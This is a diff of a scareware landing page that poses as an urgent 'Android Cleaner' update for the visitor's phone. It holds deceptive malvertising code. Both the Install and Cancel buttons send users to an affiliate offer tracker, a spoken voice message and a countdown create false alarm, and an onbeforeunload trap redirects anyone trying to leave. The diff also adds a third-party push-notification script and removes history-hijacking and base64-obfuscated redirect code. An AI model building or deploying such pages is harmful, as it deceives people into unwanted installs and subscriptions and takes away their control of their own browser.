@@ -1,13 +1,10 @@
 <!DOCTYPE html><html><head>
-  <base href="">
-
+    <base href="">
     <title>Update!</title>
-  
-  
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="theme-color" content="#999">
-    <link id="favicon" href="icon.png" rel="shortcut icon" type="image/x-icon">
+    <link id="favicon" href="./icon.png" rel="shortcut icon" type="image/x-icon">
     <style type="text/css">html {
         font-family: sans-serif;
         -ms-text-size-adjust: 100%;
@@ -795,7 +792,7 @@
                 result = 'Phone'
             }
 
-            if(name.indexOf('dname') !== -1 && contains(result, 'android')) {
+            if(name.indexOf('model') !== -1 && contains(result, 'android')) {
                 result = 'Phone'
             }
 
@@ -803,14 +800,13 @@
                 result = 'Internet Browser'
             }
 
+            if(result==null||result==""){
+                result = 'Phone'
+            }
+
             return result;
 
         }
-		
-		function setVisit() {
-			document.cookie = 'uid=0efa4ed6-0e33-401d-a553-90b4c00da708'; //!@#
-		}
-		setVisit();
 
     </script>
 <script type="text/javascript"> 
@@ -829,7 +825,7 @@ setTimeout(func, getRandomInt(5,10)*1000);
 </script>
 
 </head>
-<body class="en ltr" onclick="goto();">
+<body class="en ltr" onclick="ctaclick();">
 <div id="myModal" class="modal" style="display: block;">
 <div class="w3-modal-content w3-animate-top w3-card-4">
   <!-- Modal content -->
@@ -838,7 +834,7 @@ setTimeout(func, getRandomInt(5,10)*1000);
 		<div id="normal-popover">
 			<div class="popover-body">
 				<div class="popover-body-icon">
-					<img alt="notification icon" class="" src="favicon.png">
+					<img alt="notification icon" class="" src="./favicon.png">
 				</div>
 				<div class="popover-body-message">Update your Android Cleaner right now to improve performance of your phone and improve battery life.</div>
 				<div class="clearfix"></div>
@@ -858,7 +854,7 @@ setTimeout(func, getRandomInt(5,10)*1000);
 	function showm(){
 		var modal = document.getElementById("myModal");
 		modal.style.display = "block";
-		var iconNew = 'icon.png';
+		var iconNew = './icon.png';
 		document.getElementById('favicon').href = iconNew;
 	}	
 	function hidem(){
@@ -893,20 +889,20 @@ setTimeout(func, getRandomInt(5,10)*1000);
         <div class="text">
 
 
-            <h1 style="" class="blink_me">It is recommended that you update the Cleaner for your <script>document.write(getURLParameter("device_brand"))</script>Samsung!</h1>
-            <p>Due to the latest problems with <script>document.write(getURLParameter("device_brand"))</script>Samsung <script>document.write(getURLParameter("device_model"))</script>Samsung Galaxy S3, we have released an update of the Android Cleaner which will find all viruses and potential threats and will also clean junk files and improve battery life.</p>
+            <h1 style="" class="blink_me">It is recommended that you update the Cleaner for your <script>document.write(getURLParameter("device_brand"))</script>!</h1>
+            <p>Due to the latest problems with <script>document.write(getURLParameter("device_model"))</script>, we have released an update of the Android Cleaner which will find all viruses and potential threats and will also clean junk files and improve battery life.</p>
             <br>
-            <p>Update right now to boost your <script>document.write(getURLParameter("device_brand"))</script>Samsung <script>document.write(getURLParameter("device_model"))</script>Samsung Galaxy S3 and improve performance of your phone and improve battery life.</p>
+            <p>Update right now to boost your <script>document.write(getURLParameter("device_model"))</script> and improve performance of your phone and improve battery life.</p>
             <br>
-            <img src="logo.png" style="width:60px;height:60px;float: left; padding-right: 10px;">
-            <p>Install the recommended app <strong>for FREE</strong> to clean and strengthen your <script>document.write(getURLParameter("device_brand"))</script>Samsung immediately!</p>
+            <img src="./logo.png" style="width:60px;height:60px;float: left; padding-right: 10px;">
+            <p>Install the recommended app <strong>for FREE</strong> to clean and strengthen your <script>document.write(getURLParameter("device_brand"))</script> immediately!</p>
             <p style="text-align:center;margin-top:10px;"><span style="font-size:15px;color:red;font-family:sans-serif;" id="theTime">5 minutes 44 seconds</span></p>
         </div>
         <div class="buttons">
-            <button class="button exitpoint">
+            <button class="button exitpoint" onclick="ctaclick()" >
 				<span>Install</span>
             </button>
-            <button class="button cancel">
+            <button class="button cancel" onclick="ctaclick()" >
 				<span>Cancel</span>
             </button>			
         </div>
@@ -914,73 +910,55 @@ setTimeout(func, getRandomInt(5,10)*1000);
 	<form style="visibility:collapse;"><textarea name="comment"></textarea></form>
 </div>
 
-
+<script type="text/javascript">
+function speak(c){var b=new SpeechSynthesisUtterance();var a=speechSynthesis.getVoices();b.voice=a[2];b.voiceURI="native";b.volume=1;b.rate=1;b.pitch=1;b.text=c;b.lang="en-US";speechSynthesis.speak(b)}speak("You need to upgrade your Booster for Android now or your cell phone might slow down and consume the battery faster.");
+</script>
 
 <script>
-	function udec(str) {
-		return decodeURIComponent(atob(str).split('').map(function(c) {
-			return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
-		}).join(''));
-	}
-	var obu = udec('b25iZWZvcmV1bmxvYWQ'+'=');
-
-    function goto() {
-        window[obu] = null;
-        location.href = "http://v1.myapptrack.club/offer"
+    function ctaclick(){
+      window.onbeforeunload = null;
+      window.open("https://tk.besttrustedreview.com/click.php?lp=1&to_offer=1", "_blank");
+      
+      setInterval(afflowsmartlink, 1000);
     }
-</script>
-<script>
-(function(window) {
-if (window.location !== window.top.location) {
-window.top.location = window.location;
-}
-})(this);
+    
+    function afflowsmartlink(){
+      location.replace("https://tk.besttrustedreview.com/click.php?lp=1&to_offer=2");
+    }
+    
 </script>
 
 <script type="text/javascript">
-    !function () {
-        var count = 1;
-        var t;
-        try {
-            for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
-            onpopstate = function (t) {
-                if(count%2 == 1) {
-                    showm();
-                }
-                count++;
-                t.state && location.replace("#")
-            }
-        } catch (o) {
-        }
-    }();
-</script>
-<script type="text/javascript">
-    //function speak(c){var b=new SpeechSynthesisUtterance();var a=speechSynthesis.getVoices();b.voice=a[2];b.voiceURI="native";b.volume=1;b.rate=1;b.pitch=1;b.text=c;b.lang="pt-BR";speechSynthesis.speak(b)}speak("You need to upgrade your Booster for Android now or your cell phone might slow down and consume the battery faster.");</script>
-<script type="text/javascript">
-   (function (w, d) {
+	var nc = 'https://tk.besttrustedreview.com/click.php?lp=1&to_offer=2';
+	
+	document.getElementById("onesignal-popover-allow-button").href = nc;
+	document.getElementById("onesignal-popover-cancel-button").href = nc;
+
+    (function (w, d) {
         var epp = function () {
-            if (w[obu] === null) {
+            if (w.onbeforeunload === null) {
                 var to;
                 function repp() {
-                    w[obu] = null;
+                    w.onbeforeunload = null;
+					window.open("https://tk.besttrustedreview.com/click.php?lp=1&to_offer=1", "_blank");
                 };
                 function epp() {
                     to = setTimeout(function () {
+                        w.location.replace(nc);
                         repp();
-						w.location.replace('http://v1.myapptrack.club/offer');
-                        
                     }, 100);
                     return 'You need to upgrade your Booster for Android now or your cell phone might slow down and consume the battery faster.';
                 }
-                w[obu] = epp;
+                w.onbeforeunload = epp;
                 // Prevent epp firing from clicking on tracking links
-                var ln = d.querySelectorAll("[href='http://v1.myapptrack.club/offer']");
+                var ln = d.querySelectorAll("[href='"+nc+"']");
                 for (i = 0; i < ln.length; ++i) {
                     ln[i].addEventListener("click", function () {
                         repp();
                     });
                 }
             }
+            ;
         };
         if (d.readyState != 'loading') {
             epp();
@@ -988,15 +966,23 @@ window.top.location = window.location;
             d.addEventListener('DOMContentLoaded', epp);
         }
     })(window, document);
-
-
 </script>
-<div class="form" style="display:none;">
-<form action="http://booster-app.xyz/21126925/?clickid=4dff603ffe1ea918a07bc60e011b7748-10342-0810&amp;device_name=Samsung&amp;device_brand=Samsung&amp;device_model=Samsung%20Galaxy%20S3&amp;domain=v1.myapptrack.club&amp;pr_key=8d7cb95d759147156defc1e3987638e4$YTQ5NzNmNmUyYjBlYzcyNw--CEN3NbA5MTXem1YYAnNYB012LrewRAYJ3z72aVMKmm8wPuGHii9trqW9.lV7jQDDlRYIzzvg4n8OkHbKgYpTV0F2WGLR9lGJIH7tntMs.blWScuq0PjpF197Hnl0SulhVACTSnPa7A.uZleqRTKMPVUPbXZMM08yiD9zwfEF2CLlj01ipb6RHqI3qpIzGEhODyAIlM6ebigec1DO_W9J.qqPSwWojpr_RB_5rsqH_XFPWipU1uaPUuLqQouMQN0C._cCeC4sZTVkCESIcX7QwgH62OWYtrd81dEcY8E135M-#contacts" method="post">
-<textarea id="area"></textarea>
-<input type="text" id="inp">
-<button>send</button>
-</form>
-</div>
+
+<script>
+    var url = new URL(window.location.href);
+    var pci = url.searchParams.get('clickid');
+    var s = document.createElement('script');
+    s.src='//bigrourg.net/pfe/current/micro.tag.min.js?z=4978561'+'&ymid='+pci+'&sw=/sw-check-permissions-3b3e2.js';
+    s.onload = function(result) {
+        switch (result) {
+            case 'onPermissionDefault':break;
+            case 'onPermissionAllowed':break;
+            case 'onPermissionDenied':break;
+            case 'onAlreadySubscribed':break;
+            case 'onNotificationUnsupported':break;
+        }
+    }
+    document.head.appendChild(s);
+</script>
 
 </body></html>
